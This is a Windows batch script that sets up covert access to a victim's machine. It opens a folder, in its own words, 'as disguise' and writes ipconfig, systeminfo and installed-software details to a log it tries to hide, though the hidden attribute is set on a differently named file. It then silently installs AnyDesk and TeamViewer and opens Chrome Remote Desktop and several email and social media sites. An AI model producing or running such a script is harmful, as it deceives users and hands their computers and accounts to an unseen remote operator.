REM Do not echo out
@echo off

REM Set naming of log file
set LOGFILE=%USERNAME%.log

REM Output everything to log file
call :LOG > %LOGFILE%
exit /B



REM Script start here
:LOG

REM Set log file attribute = hidden 
attrib %USERNAME%-information.log +h

REM Open the "Application" folder as disguise 
echo.
echo "Opening the folder of \"Application\""
start explorer .

echo.
echo "=========================="
echo "Retrieving information ..."
echo "=========================="
echo.

echo "======"
echo "IP ..."
echo "======"
echo.
ipconfig /all

echo.
echo "======================="
echo "System Information ..."
echo "======================="
systeminfo

echo.
echo "============"
echo "Username ..."
echo "============"
echo.
echo %USERNAME%

echo.
echo "=============================================================="
echo "Getting information of software installed on the machines ..."
echo "=============================================================="
echo.
wmic product list STATUS

echo.
echo "==================="
echo "Staring AnyDesk ..."
echo "==================="
start AnyDesk.exe

echo.
echo "============================"
echo "Check AnyDesk is running ..."
echo "============================"
tasklist | findstr "Any"

echo.
echo "================"
echo "Kill AnyDesk ..."
echo "================"
taskkill /IM "AnyDesk.exe" /F

echo.
echo "====================="
echo "AnyDesk installing..."
echo "====================="
AnyDesk.exe --install "C:\Program Files (x86)\AnyDesk" --create-desktop-icon --silent
dir /A "C:\Program Files (x86)\"

echo.
echo "======================"
echo "Staring TeamViewer ..."
echo "======================"
start TeamViewer_Setup.exe

TIMEOUT /T 3
echo.
echo "==============================="
echo "Check TeamViewer is running ..."
echo "==============================="
tasklist | findstr "Team"

echo.
echo "==================="
echo "Kill TeamViewer ..."
echo "==================="
taskkill /f /im Team*

echo.
echo "========================"
echo "Teamviewer installing..."
echo "========================"
TeamViewer_Setup.exe /S 
REM dir /A "C:\Program Files (x86)\" | findstr "Team"
dir /A "C:\Program Files (x86)\"

echo .
echo "Starting Chrome Remote Desktop via Chrome ..."
REM start https://remotedesktop.google.com/
start chrome https://chrome.google.com/webstore/detail/chrome-remote-desktop/inomeogfingihgjfjlpeplalcfajhgai?hl=en

echo .
echo "Starting Gmail via Edge..."
start microsoft-edge:https://www.gmail.com

echo .
echo "Starting Google Drive via Chrome ..."
start chrome https://www.google.com/intl/en-GB/drive/

echo .
echo "Starting Yahoo Mail via Firefox ..."
start firefox https://mail.yahoo.com

echo .
echo "Starting Facebook via chrome ..."
start chrome https://www.facebook.com

echo .
echo "Starting TikTok via chrome ..."
start chrome https://www.tiktok.com/